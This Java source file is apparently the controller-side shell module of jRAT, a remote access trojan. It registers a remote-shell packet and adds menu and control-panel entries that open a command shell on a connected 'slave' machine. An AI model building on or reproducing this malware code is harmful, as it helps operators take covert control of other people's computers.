package jrat.module.shell;

import jrat.api.ClientEventListener;
import jrat.api.ControllerModule;
import jrat.api.Resources;
import jrat.api.ui.ClientMenu;
import jrat.api.ui.ClientMenuItem;
import jrat.api.ui.ControlPanel;
import jrat.api.ui.ControlPanelTab;
import jrat.controller.AbstractSlave;
import jrat.controller.Slave;
import jrat.controller.packets.incoming.IncomingPackets;
import jrat.module.shell.packets.Packet21RemoteShell;
import jrat.module.shell.ui.FrameRemoteShell;

public class ShellControllerModule extends ControllerModule {

    public void init() throws Exception {
        IncomingPackets.register((short) 21, Packet21RemoteShell.class);

        menuItems.add(new ClientMenuItem(ClientMenu.Category.QUICK_OPEN,"Shell", Resources.getIcon("terminal"), new ClientEventListener() {
            @Override
            public void emit(AbstractSlave slave) {
                new FrameRemoteShell((Slave) slave).displayFrame();
            }
        }));

        controlPanelItems.add(new ControlPanelTab(ControlPanel.Category.SYSTEM, "Shell", Resources.getIcon("terminal"), FrameRemoteShell.class));
    }
}
